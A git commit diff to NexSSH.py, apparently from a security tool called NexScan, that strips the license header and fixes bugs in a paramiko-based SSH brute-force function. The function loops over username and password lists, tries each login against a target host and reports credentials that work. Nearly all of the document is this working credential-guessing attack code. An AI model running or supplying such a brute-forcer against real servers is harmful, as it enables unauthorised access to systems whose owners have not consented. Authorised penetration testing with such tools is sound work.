d11d613328acb854d2e4486de0b2fdd2700839ab
hm05 <harshmurjani5114@gmail.com>
2024-10-09 13:02:43 +0530

    SSH alpha test done!

--- NexSSH.py
+++ NexSSH.py
@@ -1,20 +1,9 @@
-#!/usr/bin/env python3
-"""
-This file is part of NexScan.
-
-NexScan is free software: you can use it for personal and non-commercial purposes under the terms of the Custom License.
-
-For commercial use, please contact Nexeo Security at business@nexeosecurity.tech.
-
-NexScan is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the Custom License for more details, located in the LICENSE file.
-"""
-
 import os
 import argparse
 import paramiko
 
 def ssh_bruteforce(host, port, userfile, passfile, user=None, password=None):
-    print(user, password, userfile='./unix_users.txt', passfile='./unix_passwords.txt')
+    print(f"user: {user}, password: {password}, userfile: {userfile}, passfile: {passfile}")
     try:
         if passfile and user:
             with open(passfile, 'r') as f:
@@ -25,11 +14,11 @@ def ssh_bruteforce(host, port, userfile, passfile, user=None, password=None):
                 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 try:
                     ssh.connect(host, port, user, password)
-                    print(f'\033[92m [+]\033[0m {user} : ', password)
+                    print(f'\033[92m [+]\033[0m {user} : {password}')
                     break
 
                 except paramiko.AuthenticationException:
-                    print(f'\033[91m [-]\033[0m {user} : ', password)
+                    print(f'\033[91m [-]\033[0m {user} : {password}')
 
         elif userfile and password:
             with open(userfile, 'r') as f:
@@ -40,11 +29,11 @@ def ssh_bruteforce(host, port, userfile, passfile, user=None, password=None):
                 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 try:
                     ssh.connect(host, port, user, password)
-                    print(f'\033[92m [+]\033[0m {user} : ', password)
+                    print(f'\033[92m [+]\033[0m {user} : {password}')
                     break
 
                 except paramiko.AuthenticationException:
-                    print(f'\033[91m [-]\033[0m {user} : ', password)
+                    print(f'\033[91m [-]\033[0m {user} : {password}')
 
         elif userfile and passfile:
             with open(userfile, 'r') as f:
@@ -57,13 +46,13 @@ def ssh_bruteforce(host, port, userfile, passfile, user=None, password=None):
                     password = password.strip()
                     ssh = paramiko.SSHClient()
                     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                try:
-                    ssh.connect(host, port, user, password)
-                    print(f'\033[92m [+]\033[0m {user} : ', password)
-                    break
+                    try:
+                        ssh.connect(host, port, user, password)
+                        print(f'\033[92m [+]\033[0m {user} : {password}')
+                        return  # Exit after a successful login
 
-                except paramiko.AuthenticationException:
-                    print(f'\033[91m [-]\033[0m {user} : ', password)
+                    except paramiko.AuthenticationException:
+                        print(f'\033[91m [-]\033[0m {user} : {password}')
 
         else:
             print('\033[91m [-]\033[0m Please provide both username and password files')
@@ -72,4 +61,3 @@ def ssh_bruteforce(host, port, userfile, passfile, user=None, password=None):
     except KeyboardInterrupt:
         print('\033[91m [-]\033[0m Detecting Keyboard Interrupt...Exiting...')
         exit(1)
-        
